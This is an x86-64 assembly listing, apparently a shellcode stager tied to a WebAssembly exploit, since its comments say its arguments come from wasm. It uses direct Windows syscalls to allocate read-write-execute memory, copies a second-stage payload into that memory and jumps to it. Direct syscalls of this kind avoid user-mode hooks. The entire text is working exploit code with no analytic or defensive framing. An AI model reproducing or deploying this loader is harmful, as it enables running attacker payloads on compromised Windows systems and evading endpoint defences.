BITS 64

; wasm arg1 = stage1 address -> rax
; wasm arg2 = stage1 length -> rdx

; save stack, rdi, rbx, rsi
push rbp
mov rbp, rsp
sub rsp, 30h
push rdi
push rbx
push rsi

mov rdi, rax                     ; stage1 address backup
mov rbx, rdx                     ; stage1 length backup

xor r10, r10                     ; parameter 1 - ProcessHandle
dec r10
push 0h                          ; parameter 2 - *BaseAddress
mov rdx, rsp
mov r8, 0h                       ; parameter 3 - ZeroBits
push rbx                         ; parameter 4 - RegionSize
mov r9, rsp
mov dword [rsp+28h], 1000h       ; parameter 5 - AllocationType - 0x1000 MEM_COMMIT
mov dword [rsp+30h], 40h         ; parameter 6 - Protect - 0x40 PAGE_EXECUTE_READWRITE
mov rax, 18h                     ; NtAllocateVirtualMemory syscall code (Windows 10 - 11)
syscall
pop rax
pop rax

; stage1 -> rdi
; stage1 length -> rbx
; stage1 dest addr -> rax

mov rsi, rax                     ; stage1 dest addr backup

xor r10, r10                     ; parameter 1 - ProcessHandle
dec r10
mov rdx, rax                     ; parameter 2 - BaseAddress
mov r8, rdi                      ; parameter 3 - Buffer
mov r9, rbx                      ; parameter 4 - NumberOfBytesToWrite
mov qword [rsp+28h], 0h          ; parameter 5 - NumberOfBytesWritten
mov rax, 3ah                     ; NtWriteVirtualMemory syscall code (Windows 10 - 11)
syscall

; restore rsi, rbx, rdi, stack, jmp to stage1
mov rax, rsi
pop rsi
pop rbx
pop rdi
mov rsp, rbp
pop rbp
jmp rax
